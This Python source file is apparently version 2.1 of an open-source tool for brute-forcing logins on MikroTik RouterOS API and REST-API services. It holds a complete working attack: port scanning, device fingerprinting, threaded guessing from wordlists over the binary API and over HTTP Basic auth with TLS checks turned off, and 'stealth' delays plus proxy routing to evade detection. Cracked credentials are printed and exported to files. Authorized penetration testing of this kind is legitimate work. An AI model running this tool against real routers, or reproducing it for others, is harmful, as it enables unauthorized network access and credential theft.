#!/usr/bin/env python
# -*- coding: utf-8 -*-
# Author: Andre Henrique (LinkedIn: https://www.linkedin.com/in/mrhenrike | X: @mrhenrike)

_version = "2.1"

# Check if python version is between 3.8.x until 3.12.x
import sys

MIN_PYTHON = (3, 8)
MAX_PYTHON = (3, 12)
current_version = sys.version_info[:2]

if current_version < MIN_PYTHON:
    print(f"\n[ERROR] Unsupported Python version: {sys.version.split()[0]}")
    print("[INFO] MikrotikAPI-BF requires Python 3.8 or higher.\n")
    sys.exit(1)

elif current_version > MAX_PYTHON:
    print(f"\n[WARN] You are using Python {sys.version.split()[0]}, which is newer than supported (max: 3.12.x).")
    print("[INFO] Some modules (e.g., 'telnetlib') may be deprecated or removed in this version.")
    print("[SUGGESTION] It's recommended to install Python 3.12.x (no need to uninstall your current version).")

    try:
        # Check if running in non-interactive mode (like CI/CD or automated testing)
        if hasattr(sys.stdin, 'isatty') and not sys.stdin.isatty():
            print("\n[INFO] Running in non-interactive mode, continuing with Python 3.13+...")
            response = "y"
        else:
            response = input("\n[?] Do you want to continue anyway? [y/N]: ").strip().lower()
        
        if response not in ["y", "yes"]:
            print("\n[ABORTED] Execution cancelled by user.\n")
            sys.exit(1)
    except (KeyboardInterrupt, EOFError):
        print("\n[INFO] Non-interactive mode detected, continuing with Python 3.13+...")
        response = "y"

# Enhanced imports for v2.1
import time, argparse, threading, concurrent.futures, socket, urllib3, warnings, requests
from datetime import datetime
from pathlib import Path
from requests.auth import HTTPBasicAuth

# Suppress warnings from urllib3 and requests
warnings.filterwarnings("ignore", category=DeprecationWarning)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Check if the required modules are available
try:
    from _api import Api
except ModuleNotFoundError:
    raise ImportError(f"[{datetime.now().strftime('%H:%M:%S')}] Module '_api' not found.")

try:
    from _log import Log
except ModuleNotFoundError:
    raise ImportError(f"[{datetime.now().strftime('%H:%M:%S')}] Module '_log' not found.")

# Import new v2.1 modules
try:
    from _export import ResultExporter
    from _progress import ProgressBar
    from _proxy import ProxyManager
    from _stealth import StealthManager
    from _fingerprint import MikrotikFingerprinter
    from _wordlists import SmartWordlistManager
    from _reports import PentestReportGenerator
    from _cli import PentestCLI
except ModuleNotFoundError as e:
    print(f"[WARN] Some v2.1 modules not available: {e}")
    ResultExporter = None
    ProgressBar = None
    ProxyManager = None
    StealthManager = None
    MikrotikFingerprinter = None
    SmartWordlistManager = None
    PentestReportGenerator = None
    PentestCLI = None

# Check if the required modules are available
def current_time():
    return datetime.now().strftime("%H:%M:%S")

# Function to check if a port is open on the target host
def is_port_open(host, port, timeout=3):
    try:
        with socket.create_connection((host, port), timeout=timeout):
            return True
    except (socket.timeout, socket.error, ConnectionRefusedError, OSError):
        return False

# Function to test REST API login
def test_restapi_login(host, username, password, port, use_ssl=False):
    protocol = "https" if use_ssl else "http"
    url = f"{protocol}://{host}:{port}/rest/system/identity"
    try:
        response = requests.get(url, auth=HTTPBasicAuth(username, password), timeout=5, verify=False)
        return response.status_code == 200
    except Exception:
        return False

# Enhanced Bruteforce class with v2.1 features
class EnhancedBruteforce:
    def __init__(self, target, usernames, passwords, combo_dict, delay, api_port=8728, rest_port=8729, http_port=80, use_ssl=False, ssl_port=443, max_workers=2, verbose=False, verbose_all=False, validate_services=None, services_ok=None, show_progress=False, proxy_url=None, export_formats=None, export_dir="results", max_retries=1, stealth_mode=True, fingerprint=True):
        self.target = target
        self.api_port = api_port
        self.rest_port = rest_port
        self.http_port = http_port
        self.ssl_port = ssl_port
        self.usernames = usernames
        self.passwords = passwords
        self.combo_dict = combo_dict
        self.delay = delay
        self.use_ssl = use_ssl
        self.max_workers = min(max_workers, 15)
        self.verbose = verbose
        self.verbose_all = verbose_all
        self.validate_services = validate_services or {}
        self.services_ok = services_ok or {}
        self.log = Log(verbose=verbose, verbose_all=verbose_all)
        self.wordlist = []
        self.successes = []
        self.lock = threading.Lock()
        self.index_lock = threading.Lock()
        self.index = 0
        
        # v2.1 features
        self.show_progress = show_progress
        self.progress_bar = None
        self.proxy_manager = None
        self.export_formats = export_formats or []
        self.export_dir = export_dir
        self.max_retries = max_retries
        self.stealth_mode = stealth_mode
        self.fingerprint = fingerprint
        
        # Initialize v2.1 modules
        self.stealth_manager = StealthManager(enabled=stealth_mode) if StealthManager else None
        self.fingerprinter = MikrotikFingerprinter() if MikrotikFingerprinter else None
        self.wordlist_manager = SmartWordlistManager() if SmartWordlistManager else None
        
        # Setup proxy if provided
        if proxy_url and ProxyManager:
            self.proxy_manager = ProxyManager(proxy_url)
            if not self.proxy_manager.test_connection():
                self.log.warning("[PROXY] Connection test failed. Continuing without proxy.")
                self.proxy_manager = None
            else:
                self.log.info(f"[PROXY] Using proxy: {proxy_url}")
        
        self.load_wordlist()

    def load_file(self, path):
        with open(path, 'r', encoding='utf-8') as f:
            return [line.strip() for line in f if line.strip()]

    def load_wordlist(self):
        try:
            if self.combo_dict:
                self.wordlist = [tuple(line.split(':')) for line in self.load_file(self.combo_dict) if ':' in line]
            elif self.usernames and self.passwords:
                ufile = Path(self.usernames).is_file()
                pfile = Path(self.passwords).is_file()
                if not ufile and not pfile:
                    self.wordlist = [(self.usernames, self.passwords)]
                elif ufile and not pfile:
                    users = self.load_file(self.usernames)
                    self.wordlist = [(u, self.passwords) for u in users]
                elif not ufile and pfile:
                    pwds = self.load_file(self.passwords)
                    self.wordlist = [(self.usernames, p) for p in pwds]
                else:
                    users = self.load_file(self.usernames)
                    pwds = self.load_file(self.passwords)
                    self.wordlist = [(u, p) for u in users for p in pwds]
            elif self.usernames:
                self.wordlist = [(u, '') for u in self.load_file(self.usernames)] if Path(self.usernames).is_file() else [(self.usernames, '')]
            elif self.passwords:
                self.wordlist = [("admin", p) for p in self.load_file(self.passwords)] if Path(self.passwords).is_file() else [("admin", self.passwords)]
            else:
                self.wordlist = [("admin", "")]
        except Exception as e:
            self.log.error(f"Error loading wordlist: {e}")
            exit(1)
        self.wordlist = list(dict.fromkeys(self.wordlist))

    def get_next_combo(self):
        with self.index_lock:
            if self.index >= len(self.wordlist):
                return None
            combo = self.wordlist[self.index]
            self.index += 1
            return combo

    def worker(self):
        thread_id = threading.get_ident()
        while True:
            combo = self.get_next_combo()
            if combo is None:
                break
            user, password = combo

            # Apply stealth delay if enabled
            if self.stealth_manager:
                self.stealth_manager.apply_stealth_for_thread(thread_id, self.delay)
            else:
                time.sleep(self.delay)

            # Always show what we're testing (but only first few if not verbose)
            if self.verbose or self.verbose_all:
                self.log.debug(f"Trying -> {user}:{password}")
            elif self.index <= 3:
                print(f"[{current_time()}] [TEST] {user}:{'*' * len(password) if password else '(empty)'}")

            services = []

            # === Test API ===
            if self.services_ok.get("api"):
                try:
                    api = Api(self.target, self.api_port, use_ssl=False)
                    result = api.login(user, password)
                    if result:
                        services.append("api")
                        self.log.success(f"[API] {user}:{password}")
                    elif self.verbose or self.verbose_all:
                        self.log.fail(f"[API] {user}:{password}")
                except Exception as e:
                    if self.verbose or self.verbose_all:
                        self.log.warning(f"[API] Connection error: {str(e)[:100]}")

            # === Test REST ===
            if self.services_ok.get("http") or (self.use_ssl and self.services_ok.get("ssl")):
                try:
                    rest_port = self.ssl_port if self.use_ssl else self.http_port
                    rest_result = test_restapi_login(
                        host=self.target,
                        username=user,
                        password=password,
                        port=rest_port,
                        use_ssl=self.use_ssl
                    )
                    if rest_result:
                        services.append("restapi")
                        self.log.success(f"[REST] {user}:{password}")
                    elif self.verbose or self.verbose_all:
                        self.log.fail(f"[REST] {user}:{password}")
                except Exception as e:
                    if self.verbose_all:
                        self.log.warning(f"[REST] error for {user}:{password} — {e}")

            # === Add valid credential ===
            if services:
                with self.lock:
                    self.successes.append({"user": user, "pass": password, "services": services, "target": self.target})
                    # Update progress bar with success
                    if self.progress_bar:
                        self.progress_bar.update(1, success=True)
            else:
                # Update progress bar without success
                if self.progress_bar:
                    self.progress_bar.update(1, success=False)

    def run(self):
        # Show attack configuration
        print("\n" + "="*60)
        print("ENHANCED ATTACK CONFIGURATION v2.1")
        print("="*60)
        print(f"Target         : {self.target}")
        print(f"API Port       : {self.api_port}")
        print(f"HTTP Port      : {self.http_port}")
        print(f"SSL Enabled    : {self.use_ssl}")
        print(f"Threads        : {self.max_workers}")
        print(f"Delay          : {self.delay}s between attempts")
        print(f"Total Attempts : {len(self.wordlist)}")
        print(f"Max Retries    : {self.max_retries}")
        print(f"Stealth Mode   : {'ON' if self.stealth_mode else 'OFF'}")
        print(f"Fingerprinting : {'ON' if self.fingerprint else 'OFF'}")
        if self.proxy_manager:
            print(f"Proxy          : Enabled")
        if self.validate_services:
            print(f"Validation     : {', '.join(self.validate_services.keys()).upper()}")
        if self.export_formats:
            print(f"Export         : {', '.join(self.export_formats).upper()}")
        print("="*60 + "\n")
        
        # Setup proxy if available
        if self.proxy_manager:
            self.log.info("[PROXY] Setting up proxy connection...")
            self.proxy_manager.setup_socket()
        
        # Fingerprint target if enabled
        if self.fingerprint and self.fingerprinter:
            self.log.info("[FINGERPRINT] Analyzing target...")
            fingerprint_info = self.fingerprinter.fingerprint_device(self.target)
            if fingerprint_info.get('is_mikrotik'):
                self.log.success(f"[FINGERPRINT] Confirmed Mikrotik device (Risk: {fingerprint_info.get('risk_score', 0):.1f}/10)")
            else:
                self.log.warning("[FINGERPRINT] Target may not be a Mikrotik device")
        
        self.log.info("[*] Starting enhanced brute force attack...")
        self.log.info(f"[*] Testing {len(self.wordlist)} credential combinations...")

        # Initialize progress bar if requested
        if self.show_progress and ProgressBar:
            self.progress_bar = ProgressBar(len(self.wordlist), show_eta=True, show_speed=True)

        with concurrent.futures.ThreadPoolExecutor(max_workers=self.max_workers) as executor:
            futures = [executor.submit(self.worker) for _ in range(self.max_workers)]
            concurrent.futures.wait(futures)

        # Finish progress bar
        if self.progress_bar:
            self.progress_bar.finish()

        # Restore socket if proxy was used
        if self.proxy_manager:
            self.proxy_manager.restore_socket()

        # Show attack statistics
        print("\n" + "="*60)
        print("ENHANCED ATTACK STATISTICS v2.1")
        print("="*60)
        print(f"Total Tested    : {len(self.wordlist)}")
        print(f"Successful      : {len(self.successes)}")
        print(f"Failed          : {len(self.wordlist) - len(self.successes)}")
        print(f"Success Rate    : {(len(self.successes)/len(self.wordlist)*100) if self.wordlist else 0:.1f}%")
        if self.stealth_manager:
            stealth_stats = self.stealth_manager.get_global_stats()
            print(f"Stealth Events  : {stealth_stats.get('total_threads', 0)}")
        print("="*60 + "\n")
        
        self.log.info("[*] Enhanced attack finished.\n")

        # === Print results ===
        if self.successes:
            print("\n## CREDENTIAL(S) EXPOSED ##")
            deduped = list({(d["user"], d["pass"]): d for d in self.successes}.values())
            max_user = max(len(d["user"]) for d in deduped)
            max_pass = max(len(d["pass"]) for d in deduped)

            print(f"{'-'*80}")
            print(f"ORD | {'USERNAME':<22} | {'PASSWORD':<22} | SERVICES")
            print(f"{'-'*80}")
            for idx, d in enumerate(deduped, start=1):
                services = ', '.join(d["services"])
                print(f"{idx:03} | {d['user']:<22} | {d['pass']:<22} | {services}")
            print(f"{'-'*80}")
            print("\nEnhanced attack completed successfully.\n")
            
            # === Export results (v2.1) ===
            if self.export_formats and ResultExporter:
                self.log.info("[*] Exporting results...")
                exporter = ResultExporter(deduped, self.target, output_dir=self.export_dir)
                
                for fmt in self.export_formats:
                    if fmt == 'json':
                        f = exporter.export_json()
                        self.log.info(f"[*] Exported JSON: {f}")
                    elif fmt == 'csv':
                        f = exporter.export_csv()
                        self.log.info(f"[*] Exported CSV: {f}")
                    elif fmt == 'xml':
                        f = exporter.export_xml()
                        self.log.info(f"[*] Exported XML: {f}")
                    elif fmt == 'txt':
                        f = exporter.export_txt()
                        self.log.info(f"[*] Exported TXT: {f}")
        else:
            print("\n## NO CREDENTIALS FOUND ##")
            print("="*60)
            print("No valid credentials were discovered.")
            print(f"Total attempts: {len(self.wordlist)}")
            print("="*60 + "\n")

# === CLI Entrypoint ===
if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser(
        description="""
    Enhanced Mikrotik RouterOS API Brute Force Tool v2.1
    --------------------------------------------------
    Perform enhanced brute-force attacks against Mikrotik RouterOS API and REST-API services.
    Features: Stealth Mode, Advanced Fingerprinting, Smart Wordlists, Professional Reports.

    Quick examples:
        python mikrotikapi-bf-v2.1.py -t 192.168.0.1 -U admin -P 123456
        python mikrotikapi-bf-v2.1.py -t 192.168.0.1 -u wordlists/labs_users.lst -p wordlists/labs_passwords.lst
        python mikrotikapi-bf-v2.1.py -t 192.168.0.1 -d wordlists/labs_mikrotik_pass.lst --stealth
        python mikrotikapi-bf-v2.1.py --interactive

    Verbosity modes:
        -v   Basic output with progress and results
        -vv  Full debug mode with detailed logs and warnings
    """,
        formatter_class=argparse.RawTextHelpFormatter
    )

    # === Target ===
    parser.add_argument("-t", "--target", help="Target IP address or hostname of Mikrotik device")

    # === Credentials ===
    parser.add_argument("-U", "--user", default="admin", help="Single username (default: admin)")
    parser.add_argument("-P", "--passw", help="Single password")
    parser.add_argument("-u", "--userlist", help="File with list of usernames")
    parser.add_argument("-p", "--passlist", help="File with list of passwords")
    parser.add_argument("-d", "--dictionary", help="File with combo list (user:pass format)")

    # === Timing and Performance ===
    parser.add_argument("-s", "--seconds", type=float, default=5, help="Delay between attempts in seconds (default: 5)")
    parser.add_argument("--threads", type=int, default=2, help="Number of concurrent threads (default: 2, max: 15)")

    # === Ports and Protocols ===
    parser.add_argument("--api-port", type=int, default=8728, help="Mikrotik API port (default: 8728)")
    parser.add_argument("--rest-port", type=int, default=8729, help="Mikrotik REST API port (default: 8729)")
    parser.add_argument("--http-port", type=int, default=80, help="HTTP port for REST-API without SSL (default: 80)")
    parser.add_argument("--ssl", action="store_true", help="Enable HTTPS requests for REST-API")
    parser.add_argument("--ssl-port", type=int, default=443, help="HTTPS port for REST-API (default: 443)")

    # === Post-login Service Validation ===
    parser.add_argument("--validate", help=(
        "Comma-separated list of services to validate after login. "
        "Supports optional custom ports: ftp, ssh, telnet (e.g., ftp=2121,ssh=2222)"
    ))

    # === Output and Debug ===
    parser.add_argument("-v", "--verbose", action="store_true", help="Verbose output with failed attempts")
    parser.add_argument("-vv", "--verbose-all", action="store_true", help="Enable full debug output")

    # === New v2.1 Features ===
    parser.add_argument("--progress", action="store_true", help="Show progress bar with ETA")
    parser.add_argument("--proxy", help="Proxy URL (e.g., socks5://127.0.0.1:9050)")
    parser.add_argument("--export", help="Export formats: json, csv, xml, txt (comma-separated)")
    parser.add_argument("--export-all", action="store_true", help="Export to all formats (JSON, CSV, XML, TXT)")
    parser.add_argument("--export-dir", default="results", help="Export directory (default: results)")
    parser.add_argument("--max-retries", type=int, default=1, help="Max retry attempts on connection failure")
    parser.add_argument("--stealth", action="store_true", help="Enable stealth mode (Fibonacci delays, User-Agent rotation)")
    parser.add_argument("--fingerprint", action="store_true", help="Enable advanced fingerprinting")
    parser.add_argument("--interactive", action="store_true", help="Start interactive CLI mode")

    args = parser.parse_args()

    # Show banner
    Log.banner(version=_version)

    # Interactive mode
    if args.interactive:
        if PentestCLI:
            cli = PentestCLI()
            cli.start()
        else:
            print("[ERROR] Interactive CLI not available. Missing _cli.py module.")
        sys.exit(0)

    # Check if target is provided for non-interactive mode
    if not args.target:
        print("[ERROR] Target is required for non-interactive mode.")
        print("Use --interactive for CLI mode or provide -t <target>")
        sys.exit(1)

    log = Log(verbose=args.verbose, verbose_all=args.verbose_all)

    # Check if ports are open
    print("\n" + "="*60)
    print("CHECKING TARGET SERVICES")
    print("="*60)
    print(f"Target: {args.target}")
    print("Scanning ports...")
    
    services_ok = {
        "api": is_port_open(args.target, args.api_port),
        "http": is_port_open(args.target, args.http_port),
        "ssl": is_port_open(args.target, args.ssl_port) if args.ssl else False
    }
    
    # Show results
    print("\nPort Scan Results:")
    print(f"  API ({args.api_port}):  {'[OK] OPEN' if services_ok.get('api') else '[FAIL] CLOSED/FILTERED'}")
    print(f"  HTTP ({args.http_port}): {'[OK] OPEN' if services_ok.get('http') else '[FAIL] CLOSED/FILTERED'}")
    if args.ssl:
        print(f"  SSL ({args.ssl_port}):  {'[OK] OPEN' if services_ok.get('ssl') else '[FAIL] CLOSED/FILTERED'}")
    print("="*60)

    # Parse export formats
    export_formats = []
    if args.export_all:
        export_formats = ['json', 'csv', 'xml', 'txt']
    elif args.export:
        export_formats = [fmt.strip().lower() for fmt in args.export.split(',')]

    # Parse validate services
    def parse_validate_services(raw_input):
        services = {}
        if not raw_input:
            return services
        for item in raw_input.split(','):
            item = item.strip()
            if '=' in item:
                name, port = item.split('=', 1)
                if port.isdigit():
                    services[name.lower()] = int(port)
            else:
                services[item.lower()] = None
        return services

    service_ports = parse_validate_services(args.validate)
    usernames = args.userlist if args.userlist else args.user
    passwords = args.passlist if args.passlist else args.passw
    
    # Enhanced Bruteforce instance
    bf = EnhancedBruteforce(
        target=args.target,
        api_port=args.api_port,
        rest_port=args.rest_port,
        http_port=args.http_port,
        usernames=usernames,
        passwords=passwords,
        combo_dict=args.dictionary,
        delay=args.seconds,
        use_ssl=args.ssl,
        ssl_port=args.ssl_port,
        max_workers=args.threads,
        verbose=args.verbose,
        verbose_all=args.verbose_all,
        validate_services=service_ports,
        show_progress=args.progress,
        proxy_url=args.proxy,
        export_formats=export_formats,
        export_dir=args.export_dir,
        max_retries=args.max_retries,
        stealth_mode=args.stealth,
        fingerprint=args.fingerprint
    )

    # Set the services_ok attribute
    bf.services_ok = services_ok

    try:
        bf.run()
    except KeyboardInterrupt:
        print(f"\n[{current_time()}] [!] Attack interrupted by user. Exiting cleanly.")
        print(f"Tested {bf.index}/{len(bf.wordlist)} combinations before interruption.\n")
    except Exception as e:
        print(f"\n[{current_time()}] [ERROR] Unexpected error: {e}")
        if args.verbose_all:
            import traceback
            traceback.print_exc()
        print("\nIf this is a bug, please report at: https://github.com/mrhenrike/MikrotikAPI-BF/issues\n")
